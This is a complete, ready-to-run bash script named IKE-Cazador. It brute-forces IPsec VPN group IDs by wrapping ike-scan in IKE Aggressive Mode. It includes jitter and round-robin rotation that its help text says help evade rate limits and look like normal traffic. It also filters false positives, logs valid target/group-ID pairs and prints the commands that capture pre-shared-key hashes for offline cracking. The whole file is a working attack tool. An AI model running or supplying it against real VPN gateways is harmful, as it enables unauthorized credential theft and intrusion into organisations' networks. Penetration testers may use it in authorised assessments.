#!/bin/bash

# ╔══════════════════════════════════════════════╗
# ║         IKE-Cazador                          ║
# ║         Group ID Brute Force Script          ║
# ║         local-gh0st                          ║
# ╚══════════════════════════════════════════════╝

# === Configuration ===
DELAY=0.2
LOGFILE="valid-groupids.log"
PORT=500  # Default IKE port

# === Colors ===
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
SOFT_YELLOW='\033[0;33m'
BLUE='\033[1;34m'
WHITE='\033[0;37m'  # Regular white, not bold
NC='\033[0m'
VALID_PAIRS=()

# === Optional flags ===
USE_JITTER=false
USE_ROTATION=false
SHOW_DEBUG=false

# === Argument Parsing ===
POSITIONAL=()
while [[ $# -gt 0 ]]; do
    case "$1" in
        -r) USE_ROTATION=true; shift ;;
        -j) USE_JITTER=true; echo -e "${GREEN}[*] Jitter enabled: random delay between 0.3s–0.99s per request${NC}"; shift ;;
        -p) PORT="$2"; shift 2 ;;
        -debug) SHOW_DEBUG=true; shift ;;
        -h|-help)
            echo -e "${YELLOW}Usage:${NC}"
            echo -e "${WHITE}./IKE-Cazador.sh <target_ip OR targets_list> <groupid_wordlist>${NC}"
            echo -e "${YELLOW}(Will use built-in wordlist from \"/danielmiessler/SecLists\" if nothing else is specified).${NC}"
            echo ""
            echo -e "${YELLOW}[-r] =${NC} ${WHITE}Use \"Group-first\" rotation: tries each group ID against all hosts before moving to the next target (round-robin). Helps avoid hammering a single host and can bypass rate limits.${NC}"
            echo -e "${YELLOW}[-j] =${NC} ${WHITE}Add a \"delay\" of .3-.99 seconds per attempt, should emulate more realistic user behavior${NC}"
            echo -e "${YELLOW}[-p] =${NC} ${WHITE}Destination port. Specify the IKE port with -p <x> (default: 500)${NC}"
            exit 0
            ;;
        *)
            POSITIONAL+=("$1")
            shift
            ;;
    esac
done

# Restore positional parameters
set -- "${POSITIONAL[@]}"

# Target and wordlist assignment
if [[ -z "$1" || "$1" =~ ^- ]]; then
    echo -e "${RED}[!] No target IP or target file provided. Positional arguments required.${NC}"
    echo -e "${YELLOW}Usage:${NC}"
    echo -e "${WHITE}./IKE-Cazador.sh <target_ip OR targets_list> <groupid_wordlist>${NC}"
    exit 1
fi

TARGET_ARG="$1"
WORDLIST="${2:-ike-groupid.txt}"

# === Validate wordlist ===
if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}[!] Wordlist not found: $WORDLIST${NC}"
    exit 1
fi

if ! command -v ike-scan &> /dev/null; then
    echo -e "${RED}[!] ike-scan not found. Please install it and run this script with sudo.${NC}"
    exit 1
fi

# === Validate target argument ===
is_valid_ip() {
    [[ "$1" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] && \
    awk -F. '{for(i=1;i<=4;i++) if($i<0||$i>255) exit 1}' <<< "$1"
    return $?
}

TARGETS=()
SCRIPT_NAME="$(basename "$0")"

if [[ -f "$TARGET_ARG" && "$(basename "$TARGET_ARG")" != "$SCRIPT_NAME" ]]; then
    VALID_IPS=()
    while IFS= read -r line || [[ -n "$line" ]]; do
        [[ -z "$line" ]] && continue
        [[ "${line:0:1}" == "#" ]] && continue
        if is_valid_ip "$line"; then
            VALID_IPS+=("$line")
        fi
    done < "$TARGET_ARG"
    # Remove duplicates
    if [ "${#VALID_IPS[@]}" -eq 0 ]; then
        echo -e "${RED}[!] Target file '$TARGET_ARG' does not contain any valid IP addresses.${NC}"
        exit 1
    fi
    # Deduplicate and count
    UNIQUE_IPS=($(printf "%s\n" "${VALID_IPS[@]}" | awk '!seen[$0]++'))
    DUP_COUNT=$(( ${#VALID_IPS[@]} - ${#UNIQUE_IPS[@]} ))
    TARGETS=("${UNIQUE_IPS[@]}")
    echo -e "${GREEN}[*] Loading targets from file: $TARGET_ARG${NC}"
    if [ "$DUP_COUNT" -gt 0 ]; then
        echo -e "${YELLOW}[*] $DUP_COUNT duplicate IP(s) detected, ignoring dupes${NC}"
    fi
elif is_valid_ip "$TARGET_ARG"; then
    TARGETS+=("$TARGET_ARG")
else
    echo -e "${RED}[!] Invalid target: '$TARGET_ARG' is not a valid IP address or a valid target list file.${NC}"
    exit 1
fi

echo -e "${GREEN}[*] Loaded ${#TARGETS[@]} target(s)${NC}"

# === Wordlist message ===
if [[ "$WORDLIST" == "ike-groupid.txt" ]]; then
    echo -e "${GREEN}[*] Using default wordlist: $WORDLIST${NC}"
else
    echo -e "${GREEN}[*] Using user-specified wordlist: $WORDLIST${NC}"
fi

# === Port message ===
if [[ "$PORT" == "500" ]]; then
    echo -e "${GREEN}[*] Using default UDP port: $PORT${NC}"
else
    echo -e "${GREEN}[*] Using user-specified UDP port: $PORT${NC}"
fi

echo -e "${GREEN}[*] Logging valid results to: $LOGFILE${NC}"
echo ""

# === Read group IDs into an array once ===
mapfile -t GROUP_IDS < "$WORDLIST"

# Track valid group IDs per target
declare -A TARGET_VALID_GROUPIDS
MULTI_VALID_TARGETS=()

# === Main brute force loop ===
if [ "$USE_ROTATION" = true ]; then
    echo -e "${GREEN}[*] Rotation enabled: rotating through GroupID list, round-robin style${NC}"
fi

if [ "$USE_ROTATION" = true ]; then
    REMAINING_TARGETS=("${TARGETS[@]}")
    for GROUPID in "${GROUP_IDS[@]}"; do
        echo -e "${YELLOW}=== Testing Group ID: $GROUPID ===${NC}"

        NEW_REMAINING_TARGETS=()
        for TARGET in "${REMAINING_TARGETS[@]}"; do
            if [[ " ${MULTI_VALID_TARGETS[@]} " =~ " $TARGET " ]]; then
                continue
            fi

            echo -ne "${YELLOW}[~] ${WHITE}Testing $GROUPID on $TARGET... ${NC}"
            OUTPUT=$(timeout 5s sudo ike-scan -A -M --id="$GROUPID" -d "$PORT" "$TARGET" 2>/dev/null)

            if echo "$OUTPUT" | grep -q "Aggressive Mode Handshake returned"; then
                echo -e "${GREEN}[VALID]${NC}"
                # Validation module: test 4 random group IDs
                VALIDATION_FALSE_POSITIVE=false
                VALIDATION_IDS=()
                while [ "${#VALIDATION_IDS[@]}" -lt 4 ]; do
                    RAND_ID="${GROUP_IDS[$((RANDOM % ${#GROUP_IDS[@]}))]}"
                    if [[ "$RAND_ID" != "$GROUPID" && ! " ${VALIDATION_IDS[@]} " =~ " $RAND_ID " ]]; then
                        VALIDATION_IDS+=("$RAND_ID")
                    fi
                done
                for ((i=0; i<4; i++)); do
                    VAL_ID="${VALIDATION_IDS[$i]}"
                    COUNT=$((4-i))
                    echo -e "${YELLOW}[~]${NC} ${GREEN}Validation module: Testing group ID $VAL_ID on $TARGET to reduce likelihood of false positive...${NC} ${YELLOW}[$COUNT]${NC}"
                    echo -ne "${YELLOW}[~]${NC} ${WHITE}Testing group ID: $VAL_ID on $TARGET... ${NC}"
                    VAL_OUTPUT=$(timeout 5s sudo ike-scan -A -M --id="$VAL_ID" -d "$PORT" "$TARGET" 2>/dev/null)
                    if echo "$VAL_OUTPUT" | grep -q "Aggressive Mode Handshake returned"; then
                        echo -e "${GREEN}[VALID]${NC}"
                        VALIDATION_FALSE_POSITIVE=true
                    else
                        echo -e "${RED}[INVALID]${NC}"
                    fi
                    sleep 2
                done
                if [ "$VALIDATION_FALSE_POSITIVE" = true ]; then
                    # Record all group IDs that triggered a VALID response (the original + validation IDs)
                    TARGET_VALID_GROUPIDS["$TARGET"]="$GROUPID ${VALIDATION_IDS[*]}"
                    echo -e "${RED}[!] $TARGET responded as VALID for multiple unrelated group IDs. Likely a false positive. Cazador will now ignore this target and you probably should too.${NC}"
                    MULTI_VALID_TARGETS+=("$TARGET")
                    continue
                else
                    echo "$TARGET : $GROUPID" >> "$LOGFILE"
                    VALID_PAIRS+=("$TARGET $GROUPID")
                    TARGET_VALID_GROUPIDS["$TARGET"]+="$GROUPID "
                    echo -e "${GREEN}[!] Stopping further tests for $TARGET due to likely success.${NC}"
                fi
            else
                echo -e "${RED}[INVALID]${NC}"
                NEW_REMAINING_TARGETS+=("$TARGET")
            fi
        done
        REMAINING_TARGETS=("${NEW_REMAINING_TARGETS[@]}")
        echo ""
        if [ "${#REMAINING_TARGETS[@]}" -eq 0 ]; then
            break
        fi
    done
else
    for TARGET in "${TARGETS[@]}"; do
        echo -e "${YELLOW}--- Scanning target: $TARGET ---${NC}"

        for GROUPID in "${GROUP_IDS[@]}"; do
            if [[ " ${MULTI_VALID_TARGETS[@]} " =~ " $TARGET " ]]; then
                break
            fi

            echo -ne "${YELLOW}[~] ${WHITE}Testing group ID: $GROUPID on $TARGET... ${NC}"
            OUTPUT=$(timeout 5s sudo ike-scan -A -M --id="$GROUPID" -d "$PORT" "$TARGET" 2>/dev/null)

            if echo "$OUTPUT" | grep -q "Aggressive Mode Handshake returned"; then
                echo -e "${GREEN}[VALID]${NC}"
                # Validation module: test 4 random group IDs
                VALIDATION_FALSE_POSITIVE=false
                VALIDATION_IDS=()
                while [ "${#VALIDATION_IDS[@]}" -lt 4 ]; do
                    RAND_ID="${GROUP_IDS[$((RANDOM % ${#GROUP_IDS[@]}))]}"
                    if [[ "$RAND_ID" != "$GROUPID" && ! " ${VALIDATION_IDS[@]} " =~ " $RAND_ID " ]]; then
                        VALIDATION_IDS+=("$RAND_ID")
                    fi
                done
                for ((i=0; i<4; i++)); do
                    VAL_ID="${VALIDATION_IDS[$i]}"
                    COUNT=$((4-i))
                    echo -e "${YELLOW}[~]${NC} ${GREEN}Validation module: Testing group ID $VAL_ID on $TARGET to reduce likelihood of false positive...${NC} ${YELLOW}[$COUNT]${NC}"
                    echo -ne "${YELLOW}[~]${NC} ${WHITE}Testing group ID: $VAL_ID on $TARGET... ${NC}"
                    VAL_OUTPUT=$(timeout 5s sudo ike-scan -A -M --id="$VAL_ID" -d "$PORT" "$TARGET" 2>/dev/null)
                    if echo "$VAL_OUTPUT" | grep -q "Aggressive Mode Handshake returned"; then
                        echo -e "${GREEN}[VALID]${NC}"
                        VALIDATION_FALSE_POSITIVE=true
                    else
                        echo -e "${RED}[INVALID]${NC}"
                    fi
                    sleep 2
                done
                if [ "$VALIDATION_FALSE_POSITIVE" = true ]; then
                    echo -e "${RED}[!] $TARGET responded as VALID for multiple unrelated group IDs. Likely a false positive. Cazador will now ignore this target and you probably should too.${NC}"
                    MULTI_VALID_TARGETS+=("$TARGET")
                    break
                else
                    echo "$TARGET : $GROUPID" >> "$LOGFILE"
                    VALID_PAIRS+=("$TARGET $GROUPID")
                    TARGET_VALID_GROUPIDS["$TARGET"]+="$GROUPID "
                    echo -e "${GREEN}[!] Stopping further tests for $TARGET due to likely success.${NC}"
                    break
                fi
            else
                echo -e "${RED}[INVALID]${NC}"
            fi

            if [ "$USE_JITTER" = true ]; then
                RANDOM_DELAY=$(awk -v min=0.3 -v max=0.99 'BEGIN{srand(); print min+rand()*(max-min)}')
                sleep "$RANDOM_DELAY"
            else
                sleep "$DELAY"
            fi
        done
        echo ""
    done
fi

echo -e "${GREEN}[+] Scan complete. Results saved to ${LOGFILE}.${NC}"

if [ "${#VALID_PAIRS[@]}" -gt 0 ]; then
    echo -e "${SOFT_YELLOW}\n[${#VALID_PAIRS[@]}] Valid pairs found:${NC}"
    for pair in "${VALID_PAIRS[@]}"; do
        TARGET=$(echo "$pair" | awk '{print $1}')
        GROUPID=$(echo "$pair" | awk '{print $2}')
        echo -e "${GREEN}$TARGET : $GROUPID${NC}"
    done

    echo -e "${SOFT_YELLOW}\n[+] To capture the hash for each valid target/group ID, run ike-scan.${NC}"
    echo -e "${SOFT_YELLOW}1. Run command${NC}"
    echo -e "${SOFT_YELLOW}2. ????${NC}"
    echo -e "${SOFT_YELLOW}3. Profit${NC}"
    echo ""
    echo -e "${SOFT_YELLOW}run:${NC}"
    for pair in "${VALID_PAIRS[@]}"; do
        TARGET=$(echo "$pair" | awk '{print $1}')
        GROUPID=$(echo "$pair" | awk '{print $2}')
        echo -e "${BLUE}ike-scan -A -M -P --id=$GROUPID $TARGET${NC}"
    done
fi

# Show this only if there are NO valid results and NO false positives
if [ "${#VALID_PAIRS[@]}" -eq 0 ] && [ "${#MULTI_VALID_TARGETS[@]}" -eq 0 ]; then
    echo -e "${SOFT_YELLOW}[+] No valid results returned. Consider trying again with a different GroupID wordlist, or a customized list curated to match the name, industry, region, etc. of your target organization.${NC}"
fi

if [ "${#MULTI_VALID_TARGETS[@]}" -gt 0 ]; then
    echo -e "${RED}\n[!] WARNING: The following host(s) responded as VALID for multiple unrelated group IDs. This likely indicates a false positive and the PSK may not be crackable.${NC}"
    for TARGET in "${MULTI_VALID_TARGETS[@]}"; do
        echo -e "${YELLOW}$TARGET${NC}"
    done
fi
